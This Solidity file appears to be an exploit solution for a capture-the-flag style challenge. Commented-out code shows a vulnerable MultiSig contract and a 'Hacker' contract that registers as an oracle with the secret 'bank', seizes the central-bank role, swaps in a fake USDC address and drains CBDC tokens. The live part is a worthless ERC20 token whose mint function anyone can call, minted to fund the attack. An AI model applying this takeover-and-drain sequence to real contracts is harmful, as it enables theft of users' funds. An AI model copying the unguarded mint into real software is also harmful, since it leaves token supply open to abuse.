// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

import "./IERC20.sol";
import "./ERC20.sol";

// interface CBDC is IERC20 {
//   function addOracle(string calldata _secret) external;
//   function isOracle(address _checkAddress) external view returns (bool);
// }

// contract MultiSig {
//     address public cbdc;
//     address public centralBank;
//     address public usdc = 0x2f3A40A3db8a7e3D09B0adfEfbCe4f6F81927557;
//     address[] signaturies;
//     mapping(address => bool) public signatures;

//     constructor (address _cbdc) {
//         cbdc = _cbdc;
//         centralBank = msg.sender;
//         signaturies.push(msg.sender);
//     }

//     function upgradeUSDC(address _usdc) public {
//         require(msg.sender == centralBank, "Only The Bank Can Change The USDC Token Address");
//         usdc = _usdc;
//     }

//     function signWithdrawal() public {
//         signatures[msg.sender] = true;
//     }

//     function withdrawFunds() public {
//         for (uint256 i=0; i<signaturies.length; i++) {
//             address signer = signaturies[i];
//             require(signatures[signer] == true, "Not Everyone Has Signed Off On This");
//         }
//         IERC20(cbdc).transfer(msg.sender,100000);
//     }

//     function buyFundsPublic() public {
//         IERC20(usdc).transferFrom(msg.sender,address(this), 1000000000000);
//         IERC20(cbdc).transfer(msg.sender,1);
//     }

//     function updateCentralBank(address _newBank) public {
//         bool oracle = CBDC(cbdc).isOracle(_newBank);
//         require(oracle == true, "You Are Not An Authorized Oracle");
//         centralBank = _newBank;
//     }

//     function addSignature(address _newSig) public {
//         require(msg.sender == centralBank, "Only The Bank Can Add Signatures");
//         signaturies.push(_newSig);
//     }
// }

// contract Hacker {
//     CBDC cbdc;
//     MultiSig multisig = MultiSig(0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA);
//     address tokenAddress;
//     IERC20 myUSDC_contract;

//     constructor() {
//         cbdc = CBDC(0x094251c982cb00B1b1E1707D61553E304289D4D8);
//     }

//     function set(address _myUSDC) public {
//         tokenAddress = _myUSDC;
//         myUSDC_contract = IERC20(tokenAddress);
//     }
    
//     function hack() public {
//         cbdc.addOracle("bank");
//         myUSDC_contract.approve(0x550714e1Fd747084Fc5cB2B2e3a93512972aeBdA, 100000000000000000000000);

//         multisig.updateCentralBank(address(this));
//         multisig.upgradeUSDC(tokenAddress);

//         multisig.buyFundsPublic();
//     }
// }

contract Mytoken is ERC20{

    address hacker;
    constructor(address _hacker) ERC20('my', 'mytoken') {
        hacker = _hacker;
    }
    function mint(address _hacker) public {
        _mint(_hacker, 10000000000000000000);
    }

}